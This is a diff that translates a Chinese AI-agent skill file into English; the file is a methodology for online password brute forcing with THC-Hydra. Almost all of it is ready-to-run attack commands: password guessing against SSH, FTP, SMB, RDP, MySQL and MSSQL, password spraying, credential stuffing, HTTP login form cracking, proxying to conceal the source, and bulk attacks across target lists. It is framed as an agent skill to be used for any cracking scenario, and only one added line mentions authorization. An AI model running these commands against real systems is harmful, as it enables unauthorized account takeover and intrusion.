@@ -1,107 +1,109 @@
 ---
 name: hydra-brute
-description: "使用 Hydra 进行在线密码暴力破解。当需要对 SSH/FTP/HTTP/SMB/RDP/MySQL/MSSQL 等服务进行密码爆破、密码喷洒、凭据填充时使用。Hydra 是最经典的在线暴力破解工具，支持 50+ 协议。任何涉及在线密码爆破、登录破解、协议暴力测试的场景都应使用此技能"
+description: "Online password brute forcing with Hydra. Use when you need to brute force, spray passwords, or credential stuff against services such as SSH/FTP/HTTP/SMB/RDP/MySQL/MSSQL. Hydra is the most classic online brute-forcing tool, supporting 50+ protocols. Any scenario involving online password brute forcing, login cracking, or protocol fuzzing should use this skill"
+zh-signals: "使用 Hydra 对 SSH/FTP/HTTP/SMB/RDP/MySQL 等服务进行在线密码爆破与密码喷洒。信号:Hydra,暴力破解,密码爆破,密码喷洒,凭据填充"
+when-to-use: "Use when you need to perform authorized online password brute-force or password spraying against services such as SSH, FTP, HTTP, SMB, RDP, MySQL, or MSSQL."
 metadata:
-  tags: "hydra,brute,password,暴力破解,密码爆破,SSH,FTP,HTTP,SMB,RDP,MySQL,密码喷洒,凭据填充"
+  tags: "hydra,brute,password,brute-force,password-cracking,SSH,FTP,HTTP,SMB,RDP,MySQL,password-spraying,credential-stuffing"
   category: "tool"
 ---
 
-# Hydra 在线密码暴力破解方法论
+# Hydra Online Password Brute Forcing Methodology
 
-Hydra (THC-Hydra) 是最经典的在线暴力破解工具。核心优势：**协议覆盖广**（50+ 协议）+ **灵活配置**（支持用户/密码列表、单用户多密码、多用户单密码）+ **速度快**（多线程并发）。
+Hydra (THC-Hydra) is the most classic online brute-forcing tool. Core strengths: **broad protocol coverage** (50+ protocols) + **flexible configuration** (supports user/password lists, one user with many passwords, many users with one password) + **high speed** (multi-threaded concurrency).
 
-项目地址：https://github.com/vanhauser-thc/thc-hydra
+Project URL: https://github.com/vanhauser-thc/thc-hydra
 
-## Phase 1: 基本爆破
+## Phase 1: Basic Brute Forcing
 
 ```bash
-# SSH 爆破
+# SSH brute force
 hydra -l admin -P passwords.txt ssh://target.com
 
-# FTP 爆破
+# FTP brute force
 hydra -l root -P passwords.txt ftp://target.com
 
-# SMB 爆破
+# SMB brute force
 hydra -l administrator -P passwords.txt smb://target.com
 
-# RDP 爆破
+# RDP brute force
 hydra -l administrator -P passwords.txt rdp://target.com
 
-# MySQL 爆破
+# MySQL brute force
 hydra -l root -P passwords.txt mysql://target.com
 ```
 
-## Phase 2: 用户名和密码组合
+## Phase 2: Username and Password Combinations
 
 ```bash
-# 单用户 + 密码列表
+# Single user + password list
 hydra -l admin -P top100.txt ssh://target
 
-# 用户列表 + 单密码（密码喷洒）
+# User list + single password (password spraying)
 hydra -L users.txt -p "P@ssw0rd" ssh://target
 
-# 用户列表 + 密码列表
+# User list + password list
 hydra -L users.txt -P passwords.txt ssh://target
 
-# 用户名=密码 测试
+# username=password test
 hydra -L users.txt -e nsr ssh://target
-# n=空密码, s=用户名作密码, r=反转用户名
+# n=null password, s=username as password, r=reversed username
 
-# 凭据文件（user:pass 格式）
+# Credential file (user:pass format)
 hydra -C creds.txt ssh://target
 ```
 
-## Phase 3: HTTP 表单爆破
+## Phase 3: HTTP Form Brute Forcing
 
 ```bash
-# POST 表单爆破
+# POST form brute force
 hydra -l admin -P passwords.txt target http-post-form \
   "/login:username=^USER^&password=^PASS^:F=incorrect"
 
-# GET 表单爆破
+# GET form brute force
 hydra -l admin -P passwords.txt target http-get-form \
   "/login?user=^USER^&pass=^PASS^:F=fail"
 
-# HTTPS 表单
+# HTTPS form
 hydra -l admin -P passwords.txt target https-post-form \
   "/login:user=^USER^&pass=^PASS^:F=error"
 
-# 带 Cookie
+# With Cookie
 hydra -l admin -P passwords.txt target http-post-form \
   "/login:user=^USER^&pass=^PASS^:F=fail:H=Cookie: session=abc"
 ```
 
-## Phase 4: 高级选项
+## Phase 4: Advanced Options
 
 ```bash
-# 指定端口
+# Specify a port
 hydra -l admin -P passwords.txt -s 2222 ssh://target
 
-# 控制线程数（默认 16）
+# Control the number of threads (default 16)
 hydra -l admin -P passwords.txt -t 4 ssh://target
 
-# 控制等待时间
+# Control the wait time
 hydra -l admin -P passwords.txt -w 5 ssh://target
 
-# 输出到文件
+# Output to file
 hydra -l admin -P passwords.txt -o results.txt ssh://target
 
-# 恢复中断的攻击
+# Resume an interrupted attack
 hydra -R
 
-# 详细输出
+# Verbose output
 hydra -l admin -P passwords.txt -V ssh://target
 
-# 使用代理（HTTP 模块用 HYDRA_PROXY_HTTP；SSH 等非 HTTP 模块用 HYDRA_PROXY）
+# Use a proxy (HYDRA_PROXY_HTTP for the HTTP module; HYDRA_PROXY for non-HTTP modules such as SSH)
 HYDRA_PROXY=socks5://127.0.0.1:1080 hydra -l admin -P passwords.txt ssh://target
 ```
 
-## 渗透测试常用组合
+## Common Penetration Testing Combinations
 
-| 场景 | 命令 |
+| Scenario | Command |
 |------|------|
-| SSH 快速测试 | `hydra -l root -P top100.txt -t 4 ssh://target` |
-| 密码喷洒 | `hydra -L users.txt -p "Company2024!" ssh://target` |
-| Web 登录爆破 | `hydra -l admin -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:F=fail"` |
-| 数据库爆破 | `hydra -l sa -P pass.txt mssql://target` |
-| 批量 SSH | `hydra -L users.txt -P pass.txt -M targets.txt ssh` |
+| Quick SSH test | `hydra -l root -P top100.txt -t 4 ssh://target` |
+| Password spraying | `hydra -L users.txt -p "Company2024!" ssh://target` |
+| Web login brute force | `hydra -l admin -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:F=fail"` |
+| Database brute force | `hydra -l sa -P pass.txt mssql://target` |
+| Bulk SSH | `hydra -L users.txt -P pass.txt -M targets.txt ssh` |
